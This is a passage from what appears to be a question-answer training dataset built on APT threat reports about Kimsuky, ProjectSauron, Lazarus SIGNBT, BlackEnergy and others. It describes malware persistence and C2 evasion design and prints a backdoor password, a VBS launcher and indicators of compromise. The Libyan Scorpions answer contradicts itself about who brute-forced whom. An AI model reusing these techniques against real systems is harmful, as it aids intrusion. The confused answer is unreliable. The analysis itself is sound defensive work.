C:Windows folder with the file name \"taskmgr.exe\". The original e-mail and its attachment are then deleted from the Bulgarian e-mail inbox.\nBig Headline: Directory listing collector\nThe next program sent to victims enumerates all the drives on the infected system and executes the following command on them:\ndir <drive letter>: /a /s /t /-c\nIn practice, this command is written to C:WINDOWSmsdatt.bat and executed with output redirected to C:WINDOWSmsdatl3.inc. As a result, the latter maintains a listing of all files in all the folders on the drive. The malware later reads that data and appends it to content of the file C:Program FilesCommon FilesSystemOle DBoledvbs.inc. At this point, \"oledvbs.inc \"already stores systeminfo output.\nIt's interesting that one sample of the directory listing collector was infected with the infamous \"Viking\" virus of Chinese origin. Some of this virus' modifications were wandering in the wild for years and its authors or operators would never expect to see it end up in a clandestine APT-related spying tool. For the attackers, this is certainly a big failure. Not only does the original spying program have marks of well-known malware that can be detected by anti-malware products; moreover the attackers are revealing their secret activities to cyber-criminal gangs. However, by all appearances, the attackers noticed the unwanted addition to their malware and got rid of the infection. This was the only sample bearing the Viking virus.\nDue to expensive work of malware with variety of additional files, it's not out of place to show these \"relationships\" in a diagram:\nQ: Explain how the Kimsuky malware retrieves and executes additional instructions or executables from its operator. What encryption methods are used, and what happens to the original email and its attachment after execution?",
    "output": "The Kimsuky malware retrieves instructions from its Bulgarian email account by checking for emails with specific subject tags such as Down_0, Down_1, Happy_0, Happy_2, and ddd_3. If an email with an attachment is found, the malware downloads the attachment and saves it as 'msdaipp.cnt' in C:\\\\Program Files\\\\Common Files\\\\System\\\\Ole DB. The attachment is RC4 encrypted, and the decryption key is hardcoded in the malicious samples as 'rsh!@!#'. The malware computes the MD5 hash of this string and uses it as the RC4 key to decrypt the executable. The plain executable is then dropped onto the disk as 'sqlsoldb.exe', run, and moved to the C:\\\\Windows folder with the file name 'taskmgr.exe'. The original email and its attachment are subsequently deleted from the Bulgarian email inbox.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: VFS Structure\nThe VFS can have both a linear and a two-level hierarchical view. In the case of a two-level hierarchical view, one of the levels contains the data responsible for process injection, data stealing and storing it into the local ProjectSauron cache, and the second structure contains the data for exfiltration and external network communications. In the case of a linear view, all types of modules are located on a single level.\nCuriously, in many cases the same plugins are found in both the VFS upper and lower levels.\nTypically, a local cache of stolen files is located within the C:\\System Volume Information\\_restore{ED650925-A32C-4E9C-8A73-8E6F0509309A} folder, and keylogging results are stored in %WINDIR%\\Temp\\ folder under the names 'bka*.da' or '~*.tmp'.\nThe VFS has some pre-defined packages of plugins called 'blobs'.\nThe minimal set of plugins for process injection and stored data exfiltration is called kblog.blob and consists of the following modules:\n\u2022 detach\n\u2022 ilpsend\n\u2022 dir\n\u2022 skip\nIn some cases, there exists an 'extended' package variant used that redirects the exfiltration data stream through its own local proxy-server and wipes sent documents upon completion. The extended variant contains the following modules:\n\u2022 kgate\n\u2022 knatt\n\u2022 wipe\nInterestingly, there is no automatic wiping of the documents sent to the server in the 'minimal' package. It's assumed that this task should be carried out by second Lua-script (in the case of a hierarchical VFS \u2013 the parent or child). However, this assumption is not met in all cases. This means that in such cases the stolen documents are not removed and remain stored in the ProjectSauron cache forever, which suggests a design flaw.\nBig Headline: C2 Infrastructure\nThe ProjectSauron actor is extremely well prepared when it comes to operational security. Running an expensive cyberespionage campaign like ProjectSauron requires vast domain and server infrastructure uniquely assigned to each victim organization and never again reused. This makes traditional network-based indicators of compromise useless because they are never reused in any other organization.\nWe collected 28 domains linked to 11 IPs located in the United States and several European countries that might be connected to ProjectSauron campaigns.\nEven the diversity of ISPs selected for ProjectSauron operations makes it clear that the actor did everything possible to avoid creating patterns. Unfortunately, little is known about these servers.\nThe list of ProjectSauron domains follows (domains in bold were extracted from malware, the rest were found via Passive DNS and are not validated):\nBig Headline: Attribution\nAttribution is hard and reliable attribution is rarely possible in cyberspace. Even with confidence in various indicators and apparent attacker mistakes, there is a greater likelihood that these can all be smoke and mirrors created by an attacker with a greater vantage point and vast resources. When dealing with the most advanced threat actors, as is the case with ProjectSauron, attribution becomes an unsolvable problem.\nRather than speculate on the perpetrators behind such a sophisticated attack, we instead highlight a few relevant observations made during analysis.\nMedium Headline: Language Use\nAll human-written text is in English.\nCore scenarios that orchestrated ProjectSauron modules were written in Lua, a computer language that traditionally doesn't support the UTF-16 character set for string operations. However, the target systems had some local paths in a non-Latin character set thus creating the requirement to extend Lua to support UTF-16, which the developers of ProjectSauron did. This suggests that originally the ProjectSauron developers worked and tested their code on systems with a Latin character set and only after deploying it in a real-world scenario found Lua's features deficient. Instead of scraping their interpreter of choice, they decided to modify it to implement the missing features.\nOne of the configuration files we extracted contained a list of file extensions and keywords that contain Italian words:\nThe italian keywords and filenames targeted by ProjectSauron data theft modules can be translated as following:\nMost ProjectSauron modules contain standard embedded usage output in proficient English, i.e.\nSmall Headline: arping module\n-r Resolve hosts that answer.\n-l Print only replying Ips.\n-m Do not display MAC addresses.\nThis looks like a very traditional Unix-way of outputting simple command help/usage.\nHowever, there is no common style of outputting module usage and it varies from module to module. Here is an example of a different usage output:\nWhile it may look similar to the previous usage output an experienced user would recognize the difference: it looks more like a usage of command from Windows. The option '-?' is rarely seen in the Unix world, optional parameters are enclosed with '[' and ']' characters, mandatory parameters are enclosed with '<' and '>', etc.\nThe following example of usage output is indicative of an experienced Unix user with proper formatting:\nSmall Headline: basex module\nbasex [-b <base>] [-d [-f]] [-h]\nOptions:\n-b base  64, 64url, 32, 32url or 16. Default is 64\n-d Decode data. Default is to encode\n-f Force decoding when input is invalid/corrupt\n-h This cruft\nUses standard in/out. See man page for examples.\nIt seems that the same developer created several tools, as indicated by further identical-style usage formatting.\nThere is a noteworthy reference to a 'man page', a term for standard Unix manuals. Another unique language feature is usage of \"This cruft\" for the -h option. The term cruft is rarely used by non-native speakers and actually has a article to explain its use:\n\"Cruft is jargon for anything that is left over, redundant and getting in the way. It is used particularly for superseded and unused technical and electronic hardware and useless, superfluous or dysfunctional elements in computer software.\"\n...\n\"Around 1958, the term was used in the sense of \"garbage\" by students frequenting the MIT Tech Model Railroad Club.\"\n...\n\"The FreeBSD handbook uses the term to refer to leftover or superseded object code that accumulates in a folder or directory when software is recompiled and new executables and data files produced.\"\nOlder versions of software in the *BSD world, such as cryptcat or netcat (a very common universal network client/server tool for network testing) used identical option descriptions:\nIn fact, this unique way to comment the '-h' option is mostly found in netcat-derivative projects based on the original netcat developed by an old-school hacker known as 'hobbit' (hobbit@avian.org)1 , who first released the netcat source code back in 1995. Hobbit used the word \"cruft\" four times in the netcat110 source code from 1996:\nHowever, we do not believe that hobbit can be in any way related to the development of ProjectSauron modules. The more likely explanation is that the developers of the ProjectSauron modules are also old school hackers that develop advanced tools and use \"this cruft\" as a tribute to old and stable tools.\n1 Hobbit's personal page is at http://techno-fandom.org/~hobbit/\nBig Headline: Conclusions\nEvery APT attack we analyze brings with it some new knowledge about the nature of cyberespionage. The attackers are hackers first and foremost and, as proficient hackers, they invent novel ways to get into a network, do lateral movement, leave nearly no traces, all while exfiltrating valuable data.\nProjectSauron is a very advanced actor, comparable only to the top-of-the-top in terms of sophistication: alongside Duqu, Flame, Equation, and Regin. Whether related or unrelated to these advanced actors, the ProjectSauron attackers have definitely learned from these others.\nAs a reminder, here are some features of other APT attackers that ProjectSauron attackers had carefully learned from or emulated:\nDuqu:\n\u2022 Use of intranet C2s (that compromised target servers may act as independent C2s)\n\u2022 Running only in memory (persistence on a few gateway hosts only)\n\u2022 Use of different encryption methods per victim\n\u2022 Use of named pipes for LAN communication\n\u2022 Malware distribution through legitimate software deployment channels\nFlame:\n\u2022 Lua-embedded code\n\u2022 Secure file deletion (through data wiping)\n\u2022 Attacking air-gapped systems via removable devices\nEquation and Regin:\n\u2022 Usage of RC5/RC6 encryption\n\u2022 Virtual Filesystems (VFS)\n\u2022 Attacking air-gapped systems via removable devices\n\u2022 Hidden data storage on removable devices\nThese other actors also showed what makes them vulnerable to potential exposure and ProjectSauron did its best to address these issues:\n\u2022 Vulnerable or persistent C2 locations\n\u2022 ISP, IP, domains, and tool reuse across different campaigns\n\u2022 Crypto-algorithms reuse (as well as encryption keys)\n\u2022 Forensic evidence on disk\n\u2022 Timestamps in various components\n\u2022 Large volumes of network data or unusual protocols or message formats\nIn addition, it appears that the attackers took special care with what we consider as indicators of compromise and implemented a unique pattern for each and every target they attacked, so that the same indicators\nwould have little value for anyone else. This is a summary of the ProjectSauron strategy as we see it. The attackers clearly understand that we as researchers are always looking for patterns. Remove the patterns and the operation will be harder to discover. We are aware of more than 30 organisations attacked but we are sure that this is just a tiny tip of the iceberg.\nA common organisation hit by a serious actor such as ProjectSauron can hardly cope with proper detection and mitigation of such a threat on its own. As attackers become seasoned and more mature, the defending side will have to build an identical mindset: developing the highest technical skills comparable to those of the attackers in order to resist their onslaught.\nContact us at:\n\nWhat are the key differences between the 'minimal' and 'extended' plugin packages in ProjectSauron's VFS, and how do these differences impact the attack strategy?",
    "output": "The 'minimal' plugin package, called kblog.blob, includes modules for process injection and data exfiltration: detach, ilpsend, dir, and skip. The 'extended' package adds modules for redirecting exfiltration data through a local proxy-server and wiping sent documents: kgate, knatt, and wipe. The key difference is that the 'extended' package includes additional security measures to cover tracks by wiping documents, while the 'minimal' package does not automatically wipe sent documents. This impacts the attack strategy by providing a more secure and less traceable exfiltration process in the 'extended' package, making it harder for defenders to detect and analyze the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT41's targeting of high-tech firms align with China's national strategies, and what specific industries and technologies have been targeted?",
    "output": "APT41's targeting of high-tech firms aligns with China's national strategies, particularly the 'Made in China 2025' initiative, which aims to shift China's economy towards higher value products and services. Specifically, APT41 has targeted organizations involved in the research, development, and sale of computer components used for machine-learning, autonomous vehicles, medical imaging, and the consumer market. Additionally, the group has targeted companies producing motherboards, processors, and server solutions for enterprises. For example, in April 2013, APT41 targeted an enterprise cloud-computing provider, which was a goal in the 12th Five-Year Plan.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings\nIn late February 2017, FireEye as a Service (FaaS) identified a spear phishing campaign that appeared to be targeting personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. Based on multiple identified overlaps in infrastructure and the use of similar tools, tactics, and procedures (TTPs), we have high confidence that this campaign is associated with the financially motivated threat group tracked by FireEye as FIN7.\nFIN7 is a financially motivated intrusion set that selectively targets victims and uses spear phishing to distribute its malware. We have observed FIN7 attempt to compromise diverse organizations for malicious operations \u2013 usually involving the deployment of point-of-sale malware \u2013 primarily against the retail and hospitality industries.\n\nWhy did FireEye attribute the spear phishing campaign targeting personnel involved with SEC filings to the FIN7 group? Explain the key indicators that led to this attribution.",
    "output": "FireEye attributed the spear phishing campaign targeting personnel involved with SEC filings to the FIN7 group based on multiple identified overlaps in infrastructure and the use of similar tools, tactics, and procedures (TTPs). These overlaps and similarities in TTPs are key indicators that led to the high confidence in associating this campaign with FIN7. FIN7 is known for being a financially motivated intrusion set that selectively targets victims using spear phishing to distribute its malware, often deploying point-of-sale malware primarily against the retail and hospitality industries.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nA journalist at (<http://chinadigitaltimes.net/>)China Digital Times (CDT), (an independent Chinese and English language news portal), receives an email from a source claiming to have a tip on a sensitive story: \"I have insider information that is different from what you've published\". The email includes a link to an article from the news portal. Clicking on the link displays the article with a pop-up message asking the journalist to enter their username and password in prompt designed to look like a WordPress login page. What is normally a routine interaction for the journalist has become increasingly threatening. The tip from the source is actually an attempt to steal the journalist's WordPress credentials used to manage and publish content to the news portal.\nThe rouse used in the phishing email was clever, but it did not work. The journalist was immediately suspicious of the phishing attempts and shared them with researchers at the Citizen Lab to analyze, which led to the discovery of a wider campaign targeting Chinese language news sites using various tactics including reconnaissance, phishing, (<http://mingjingnews.com/>)and malware. The campaign used domains and copied content that masqueraded as , Mingjing News, , and . It is not clear if these other news groups were directly targeted. These organizations often report on issues that are politically sensitive to the government of China and their websites are blocked in the country. Our analysis of the infrastructure used in this campaign reveals connections to previous malware operations targeting Tibetan journalists and the Thai government. These incidents includes targets that are generally within the geopolitical interest of the government of China. However, this report does not conclusively attribute the campaign to a publicly reported threat actor or state sponsor.\nThere are numerous incidents of journalists and news organizations reporting on China being targeted by digital\nespionage operations. In 2009, as part of the (<https://citizenlab.ca/wp-content/uploads/2017/05/ghostnet.pdf>)GhostNet investigation, Citizen Lab found that China-based operators had infiltrated the mail servers of Associated Press offices in London and Hong Kong. Another (<https://www.nartv.org/2009/09/28/targeted-malware-attack-on-foreign-correspondent%E2%80%99s-based-in-china/>)investigation in 2009, by Nart Villeneuve and Greg Walton uncovered a targeted malware campaign against China-based journalists working at Reuters, the Straits Times, Dow Jones, Agence France Presse, and Ansa. In recent years other major news organizations, including the (<http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-computers.html>)The New York Times, the (<https://www.wsj.com/articles/SB10001424127887323926104578276202952260718>)Wall Street Journal, and the (<https://www.washingtonpost.com/business/technology/hackers-break-into-washington-post-servers/2013/12/18/dff8c362-682c-11e3-8b5b-a77187b716a3_story.html?utm_term=.97c39e270cc4>)Washington Post, have reported intrusions of their networks and systems by China-based operators. In each incident, the operators were suspected to be sponsored by the government of China with the motivation of gathering information on China-related reporting that the newspapers were covering.\nThese historical incidents and the campaign we analyze in this report serve as a general reminder that the media are targets for digital espionage and, as a result, news organizations and journalists need to reflect on their business practices and behaviours and adopt a more systematic approach to information security.\nThis report proceeds in five parts outlined below:\nAnswer this question: What broader implications does the campaign analyzed in the Citizenlab_Campaign-Chinese-language-news-sites(07-05-2017) report have for news organizations and journalists, particularly those reporting on politically sensitive topics related to China?",
    "output": "The campaign analyzed in the report highlights that journalists and news organizations, especially those reporting on politically sensitive topics related to China, are frequent targets of digital espionage operations. The campaign used various tactics including reconnaissance, phishing, and malware, and targeted Chinese language news sites. Historical incidents, such as the GhostNet investigation and targeted malware campaigns against major news organizations, further emphasize the ongoing threat. This serves as a reminder that news organizations and journalists need to adopt a more systematic approach to information security, reflecting on their business practices and behaviors to protect themselves from such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Libyan Scorpions' use of brute force password guessing in their attack campaign relate to their overall tactics, techniques, and procedures (TTPs)?",
    "output": "Brute Force: Password Guessing is a technique used by adversaries to gain unauthorized access to accounts by systematically guessing passwords. In the context of the Libyan Scorpions' attack campaign, brute force password guessing was attempted by Cyberkov's Security Incident Response Team (CSIRT) to gain access to the attackers' database. Although the attempt failed, it highlights the importance of password security in preventing unauthorized access. Furthermore, the Libyan Scorpions' use of a PhpMyAdmin script and a Dell laptop with Skype installed suggests that they may have used weak passwords or had limited password security measures in place, making them vulnerable to brute force attacks. This lack of password security is consistent with the attackers' overall TTPs, which involved using social engineering tactics and exploiting vulnerabilities in legitimate applications to spread their malware. Overall, the Libyan Scorpions' use of brute force password guessing is just one aspect of their broader attack campaign, which relied on a combination of technical exploits and social engineering tactics to achieve their goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SIGNBT loader\nIn mid-July 2023, we detected a series of attacks on several victims who had been targeted through legitimate security software designed to encrypt web communications using digital certificates. The exact method by which this software was exploited to deliver the malware remains elusive. However, we identified post-exploitation activity within the processes of the legitimate software. In one instance, while examining the memory of the compromised security software from a victim's system, we discovered the presence of the SIGNBT malware accompanied by a shellcode. This shellcode was responsible for launching a Windows executable file directly in memory.\nThe actor uses various tactics to establish and maintain persistence on compromised systems. These include the creation of a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Additionally, in several instances, registry entries were recorded to execute legitimate files for the purpose of malicious side-loading, further ensuring a resilient persistence mechanism.\nMethods for loading the final payload\nLeveraging the spoolsv.exe process for hijacking purposes is a long-standing strategy for Lazarus. Automatically loading the ualapi.dll file after each reboot is not a new technique for this actor. We have seen similar tactics used by the (<https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/>)Gopuram malware in the past.\nPayload path: C:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100a-a00e14d9.tmp\nThe loader process retrieves the first 32 bytes from tw-100a-a00-e14d9.tmp and uses this data as an AES decryption key to decrypt the remaining contents. Once decrypted, the payload, a Windows executable identified as SIGNBT, is loaded directly into memory. In this case, the loaded payload also reads the configuration file from the same path, but with a slightly different file name.\nConfig file: C:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100b-a00e14d9.tmp\nInside this file is a base64-encoded string, mirroring the approach used in the previous SIGNBT malware method. The first 32 characters of this string serve as the AES decryption key, while the subsequent data contains configuration information used by the malware. This decrypted configuration data includes details such as three C2 addresses, which are referred to as proxies, sleep intervals, version information, monitored targets, and various other parameters critical to the malware's operation.\nBig Headline: SIGNBT\nThe majority of SIGNBT malware instances are launched through the malware loader, which operates exclusively in memory. Upon execution, the malware begins communicating with the C2 server by sending a beacon after initialization of its configuration data. In its C2 communication, the malware uses distinctive strings that start with SIGNBT. This unique characteristic has earned it the designation of SIGNBT. In addition, the malware uses different prefixes at each stage of its C2 operation to verify and maintain its activities.\nMedium Headline: Prefix name Description\nThe malware employs a multi-step process to create a 24-byte value for various purposes. First, it generates this value with the following components:\n1. 8 bytes of hard-coded value (SIGNBTLG): this is a fixed part of the value and serves to validate the legitimacy of the client's connection.\n2. 8 bytes from the MD5 hash of the hostname: the first 8 bytes of the MD5 hash of the victim's computer name are included, helping to distinguishing each victim.\n3. 8 bytes of randomly generated identifier: another 8 bytes are randomly generated, probably used for session identifiers.\nAfter creating this 24-byte value, the malware generates an additional 24 bytes of random data. These two sets of 24 bytes are then XORed together using another randomly generated 24-byte key. Subsequently, both the resulting value and the 24-byte key are encoded with base64. Finally, these encoded values are combined with either three or seven randomly generated HTTP parameter names. In all future C2 communications, the malware uses a similar structure, making it more challenging to detect and analyze its communications.\nStructure of HTTP POST data\nThe malware uses a mechanism to validate the response data received from the C2 server. Specifically, it checks to see if the response data contains a hard-coded HTML script.\n1 <!DOCTYPE html><html><head></head><body marginwidth=\"0\" marginheight=\"0\"\n2 style=\"background-color:transparent\"><script>\n3 [delivered data]\n4 </script></body></html>\nDuring the validation process, the malware decodes the first 12 bytes from the C2 server using base64, replacing the spaces with plus signs to create a seven-character string. This process is then repeated with the next 12 bytes. The first seven characters from each set are then XORed and compared to the \"success\" string. This repetitive procedure is applied to every HTTP communication sequence to verify that the response aligns with the expected \"success\" criterion.\nNext, the malware sends HTTP requests with the SIGNBTKE header, and if it receives a \"success\" message from the C2 server, it activates the getInfo function within the CCBrush class. This function gathers various information about the victim's computer, such as computer name, product name, OS details, system uptime, CPU information, system locale, time zone, network status, and malware configuration data. After sending this system-specific information, the malware sends another HTTP request with the SIGNBTGC prefix, this time using a randomly chosen embedded HTTP parameter from a list of 100 possible parameter names.\n1 client, output, h, slotname, adk, adf, pi, w, format, url, ea, flash, tt_state, dt, bpp,\n2 bdt, idt, shv, ptt, saldr, frm, ife, pv, ga_vid, ga_sid, ga_hid, ga_fc, nhd, u_tz, u_his,\n3 u_java, u_h, u_w, u_ah, u_aw, u_cd, u_nplug, u_nmime, adx, ady, biw, bih, isw, ish, ifk, 4\n5 scr_x, scr_y, eid, oid, pvsid, pem, loc, eae, brdim, vis, rsz, abl, pfx, fu, bc, ifi, uci,\n6 fsb, dtd, atyp, ei, s, t, bl, imn, ima, imad, aftp, adh, conn, ime, imex, imeh, imea,\n7 imeb, wh, scp, net, mem, sto, sys, rt, zx, su, tb, calp, rui, u, XU, TREX, UID, SID, dr, XDR, dt\nThe data received from the C2 server is decrypted using AES with a decryption key obtained from a SIGNBTLG HTTP request. If the decrypted data is \"keep\", the malware responds with an \"OK\" message using the SIGNBTSR prefix, indicating a successful communication. If there are problems, the malware uses the SIGNBTFI prefix to convey the nature of the problem or failure in communication. To summarize, the C2 communication process can be described as follows:\nC2 communication process\nIf the delivered data does not equal \"keep\", indicating that specific instructions or actions are required, the malware proceeds to invoke the corresponding class and function for backdoor behavior. The SIGNBT malware is equipped with an extensive set of functionalities designed to exert control over the victim's system. To perform these functions, the malware receives instructions from the C2 server in the form of a class name, function name, and any necessary parameters. It then executes the relevant function embedded in the malware's codebase.\nThe name of each backdoor command is straightforward, implementing commonly used Windows commands such as ping, netstat, and systeminfo. It's important to note that the backdoor is capable of implanting an additional payload for auto execution, internally named \"deploy\". This backdoor function receives file paths via command-line arguments decrypted with AES. Using this command, SIGNBT has been observed to implant the phantom DLL we already described in the SIGNBT loader section above.\nBased on the analysis, it is evident that the actor's initial compromise of the victim involved exploiting vulnerabilities within the software exploit. They then proceeded to deploy the SIGNBT malware using a DLL side-loading technique. Furthermore, the actor used the backdoor capability \"deploy\" to implant an additional payload for automated execution. This multifaceted attack demonstrates a high level of sophistication and a deliberate effort to infiltrate and maintain control over the victim's system.\nBig Headline: LPEClient\nUsing the comprehensive backdoor as described above, the actor deploys additional malware in the victim's memory. Notably, these newly delivered malware variants predominantly execute in the system's memory only, without touching the disk. Based on our telemetry, the actor has been observed to deliver such tools as LPEClient and credential dumping utilities to the victim machines.\nAdditional payload delivered by SIGNBT\nThe LPEClient malware is not new and  during an investigation of a defense contractor attack in 2020. It is designed to collect victim information and download additional payloads from a remote server to run in memory. Although it has been previously\nnoted in our threat intelligence reports to our customers, recent discoveries indicate that LPEClient has undergone significant evolution. It now employs advanced techniques to improve its stealth and avoid detection, such as disabling user-mode syscall hooking and restoring system library memory sections. This indicates a continued effort by the threat actors to increase the sophistication and effectiveness of their malware.\n\nBased on the above text, answer a question. How does the SIGNBT malware achieve persistence on compromised systems, and what tactics are used to ensure resilience?",
    "output": "The SIGNBT malware achieves persistence on compromised systems through several tactics. One method involves creating a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Another tactic includes recording registry entries to execute legitimate files for the purpose of malicious side-loading. This ensures a resilient persistence mechanism by leveraging legitimate system processes and files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the OilRig threat group utilize scheduled tasks to maintain persistence and execute malicious code in their attacks?",
    "output": "Scheduled tasks are a common mechanism used by adversaries to execute malicious code at system startup or on a scheduled basis for persistence. In the case of the OilRig threat group, they utilize scheduled tasks to execute their custom Trojan, ALMA Communicator, every two minutes with the command line argument 'Lock'. The scheduled task is created programmatically using the Schedule.Service object, which is a departure from their previous methods of creating scheduled tasks via the schtask application. This allows the Trojan to maintain persistence and continue to communicate with the command and control (C2) server even after the initial infection. Furthermore, the use of scheduled tasks enables the threat actors to execute the Trojan under the context of a specified account, potentially masking its execution under a trusted system process. The limitations of ALMA Communicator's C2 channel, which can only send 10 bytes of data at a time, may also be mitigated by the use of scheduled tasks, allowing the threat actors to exfiltrate larger files over time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: BlackEnergy evolution in 2015\nOnce activated, variants of BlackEnergy Lite allow a malware operator to check specific criteria in order to assess whether the infected computer truly belongs to the intended target. If that is the case, the dropper of a regular BlackEnergy variant is pushed to the system. The exact mechanism of infection by BlackEnergy is described in our Virus Bulletin (<https://www.virusbtn.com/conference/vb2014/abstracts/LM3-LipovskyCherepanov.xml>)presentation and this (<https://www.f-secure.com/documents/996508/1030745/blackenergy_whitepaper.pdf>)whitepaper by F-Secure.\nThe BlackEnergy malware stores XML configuration data embedded in the binary of DLL payload.\nApart from a list of C&C servers, the BlackEnergy config contains a value called build_id. This value is a unique text string used to identify individual infections or infection attempts by the BlackEnergy malware\noperators. The combinations of letters and numbers used can sometimes reveal information about the campaign and targets.\nHere is the list of Build ID values that we identified in 2015:\n2015en\nkhm10\nkhelm\n2015telsmi\n2015ts\n2015stb\nkiev_o\nbrd2015\n11131526kbp\n02260517ee\n03150618aaa\n11131526trk\nWe can speculate that some of them have a special meaning. For example 2015telsmi could contain the Russian acronym (<https://en.wiktionary.org/wiki/%D0%A1%D0%9C%D0%98>)SMI \u2013 Sredstva Massovoj Informacii, 2015en could mean Energy, and there's also the obvious \"Kiev\".\nBig Headline: KillDisk component\nIn 2014 some variants of the BlackEnergy trojan contained a plugin designed for the destruction of the infected system, named dstr.\nIn 2015 the BlackEnergy group started to use a new destructive BlackEnergy component detected by ESET products as Win32/KillDisk.NBB, Win32/KillDisk.NBC and Win32/KillDisk.NBD trojan variants.\nThe main purpose of this component is to do damage to data stored on the computer: it overwrites documents with random data and makes the OS unbootable.\nThe first known case where the KillDisk component of BlackEnergy was used was (<http://cert.gov.ua/?p=2370>)documented by CERT-UA in November 2015. In that instance, a number of news media companies were attacked at the time of the 2015 Ukrainian local elections. The report claims that a large number of video materials and various documents were destroyed as a result of the attack.\nIt should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents. It has a long list of file extensions that it tries to overwrite and delete. The complete list contains more than 4000 file extensions.\nThe KillDisk component used in attacks against energy companies in Ukraine was slightly different. Our analysis of the samples shows that the main changes made in the newest version are:\nNow it accepts a command line argument, to set a specific time delay when the destructive payload should activate.\nIt also deletes Windows Event Logs : Application, Security, Setup, System.\nIt is less focused on deleting documents. Only 35 file extensions are targeted.\nAs well as being able to delete system files to make the system unbootable \u2013 functionality typical for such destructive trojans \u2013 the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems.\nOnce activated, this variant of the KillDisk component looks for and terminates two non-standard processes with the following names:\nkomut.exe\nsec_service.exe\nWe didn't manage to find any information regarding the name of the first process (komut.exe).\nThe second process name may belong to software called ASEM Ubiquity, a software platform that is often used in Industrial control systems (ICS), or to ELTIMA Serial to Ethernet Connector. In case the\nprocess is found, the malware does not just terminate it, but also overwrites the executable file with random data.\nBig Headline: Backdoored SSH server\nIn addition to the malware families already mentioned, we have discovered an interesting sample used by the BlackEnergy group. During our investigation of one of the compromised servers we found an application that, at first glance, appeared to be a legitimate SSH server called (<https://matt.ucc.asn.au/dropbear/dropbear.html>)Dropbear SSH.\nIn the order to run the SSH server, the attackers created a VBS file with the following content:\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.CurrentDirectory =\n\"C:\\WINDOWS\\TEMP\\Dropbear\\\"\nWshShell.Run \"dropbear.exe -r rsa -d dss -a -p 6789\u2033, 0, false\nAs is evident here, the SSH server will accept connections on port number 6789. By running SSH on the server in a compromised network, attackers can\ncome back to the network whenever they want.\nHowever, for some reason this was not enough for them. After detailed analysis we discovered that the binary of the SSH server actually contains a backdoor.\nAs you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered. The same situation applies to authentication by key pair \u2013 the server\ncontains a pre-defined constant public key and it allows authentication only if a particular private key is used.\nESET security solutions detect this threat as Win32/SSHBearDoor.A trojan.\nBig Headline: Indicators of Compromise (IoC)\nIP addresses of BlackEnergy C2-servers:\n5.149.254.114\n5.9.32.230\n31.210.111.154\n88.198.25.92\n146.0.74.7\n188.40.8.72\nXLS document with malicious macro SHA-1:\nAA67CA4FB712374F5301D1D2BAB0AC66107A4DF1\nBlackEnergy Lite dropper SHA-1:\n4C424D5C8CFEDF8D2164B9F833F7C631F94C5A4C\nBlackEnergy Big dropper SHA-1: 896FCACFF6310BBE5335677E99E4C3D370F73D96\nBlackEnergy drivers SHA-1: 069163E1FB606C6178E23066E0AC7B7F0E18506B 0B4BE96ADA3B54453BD37130087618EA90168D72 1A716BF5532C13FA0DC407D00ACDC4A457FA87CD 1A86F7EF10849DA7D36CA27D0C9B1D686768E177 1CBE4E22B034EE8EA8567E3F8EB9426B30D4AFFE 20901CC767055F29CA3B676550164A66F85E2A42 2C1260FD5CEAEF3B5CB11D702EDC4CDD1610C2ED 2D805BCA41AA0EB1FC7EC3BD944EFD7DBA686AE1 4BC2BBD1809C8B66EECD7C28AC319B948577DE7B 502BD7662A553397BBDCFA27B585D740A20C49FC 672F5F332A6303080D807200A7F258C8155C54AF 84248BC0AC1F2F42A41CFFFA70B21B347DDC70E9 A427B264C1BD2712D1178912753BAC051A7A2F6C A9ACA6F541555619159640D3EBC570CDCDCE0A0D B05E577E002C510E7AB11B996A1CD8FE8FDADA0C BD87CF5B66E36506F1D6774FD40C2C92A196E278 BE319672A87D0DD1F055AD1221B6FFD8C226A6E2 C7E919622D6D8EA2491ED392A0F8457E4483EAE9 CD07036416B3A344A34F4571CE6A1DF3CBB5783F D91E6BB091551E773B3933BE5985F91711D6AC3B\nE1C2B28E6A35AEADB508C60A9D09AB7B1041AFB8 E40F0D402FDCBA6DD7467C1366D040B02A44628C E5A2204F085C07250DA07D71CB4E48769328D7DC\nKillDisk-components SHA-1:\n16F44FAC7E8BC94ECCD7AD9692E6665EF540EEC4 8AD6F88C5813C2B4CD7ABAB1D6C056D95D6AC569 6D6BA221DA5B1AE1E910BBEAA07BD44AFF26A7C0 F3E41EB94C4D72A98CD743BBB02D248F510AD925\nVBS/Agent.AD trojan SHA-1: 72D0B326410E1D0705281FDE83CB7C33C67BC8CA\nWin32/SSHBearDoor.A trojan SHA-1:\n166D71C63D0EB609C4F77499112965DB7D9A51BB\nPicture credits: 